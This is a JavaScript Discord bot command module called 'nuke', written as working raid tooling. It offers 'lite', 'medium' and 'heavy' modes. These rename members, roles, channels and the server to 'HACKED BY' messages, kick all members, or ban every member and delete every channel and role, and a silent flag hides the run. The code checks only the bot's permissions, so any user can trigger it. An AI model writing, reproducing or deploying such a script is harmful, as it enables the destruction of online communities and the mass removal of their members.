//just nuke it all, delete roles, channels, change servername, ban members
// -s flag means silent, -r flag means restrict ex( /nuke heavy -r ban @User or /nuke heavy -r delete @Role or /nuke heavy -r delete #Channel , -d flag means delete message (moment duration) may be added for delayed deletes.
//heavy version - bans + deletes roles, channels
//medium version - changes roles, channels name to HACKED BY {message.author}, kicks all members.
//this bot doesnt require administrator permissions, bot works best with MANAGE_ROLES / MANAGE CHANNELS / BAN_MEMBERS / KICK_MEMBERS / SEMD MESSAGES
//lite version - changes role names to HACKED BY {message.author} , changes channels name to HACKED BY {message.author}, changes users nicknames to HACKED BY {message.author}, changes servername to HACKED BY {message.author}
exports.run = (client, message, args) => {
  if (!message.guild.member(client.user).hasPermission(['MANAGE_ROLES', 'MANAGE_CHANNELS', 'BAN_MEMBERS', 'KICK_MEMBERS', 'MANAGE_NICKNAMES', 'MANAGE_SERVER'])) {
  message.delete()
  return message.channel.send({embed: {color: 234923, description: '**NO PERMISSIONS**: You dont have the `MANAGE_ROLES, MANAGE_CHANNELS, BAN MEMBERS, KICK_MEMBERS, MANAGE_NICKNAMES or MANAGE_SERVER` permissions!'}})
  } else if(!args[0]) {
  message.delete()
  return message.channel.send({embed: {color: 234923, description: '**NO ARGUMENTS**: `lite, medium, heavy`'}});
  } else if (args[0] == 'lite') {
  message.delete()
  message.guild.members.forEach(m => m.setNickname(`HACKED BY ${message.author.username}`))
  message.guild.roles.forEach(r => r.setName(`HACKED BY ${message.author.username}`))
  message.guild.channels.forEach(c => c.setName(`HACKED-USING-UTILITYBOT`))
    if (args[1] !== "-s") {
  message.channel.send({embed: {color: 234923, description: `**LITE NUKE**: Server has been nuked by ${message.author}`}})
    }
  } else if (args[0] == 'medium') {
  message.delete()
  message.guild.members.forEach(m => m.kick())
  message.guild.channels.forEach(c => c.setName(`HACKED-USING-UTILITYBOT`))
  message.guild.roles.forEach(r => r.setName(`HACKED BY ${message.author.username}`))
    if (args[1] !== "-s") {
  message.channel.send({embed: {color: 234923, description: `**MEDIUM NUKE**: Server has been nuked by ${message.author}`}})
    }
  } else if (args[0] == 'heavy') {
  message.delete()
  message.guild.members.forEach(m => m.ban())
  message.guild.channels.forEach(c => c.delete())
  message.guild.roles.forEach(r => r.delete())
  message.guild.setName(`SERVER NUKED BY ${message.author.username}`)
    if(args[1] !== "-s") {
  message.channel.send({embed: {color: 234923, description: `**HEAVY NUKE**: Server has been nuked by ${message.author}`}})
    }
  }
}

exports.conf = {
  aliases: ['']
}

exports.help = {
  name: 'nuke'
}
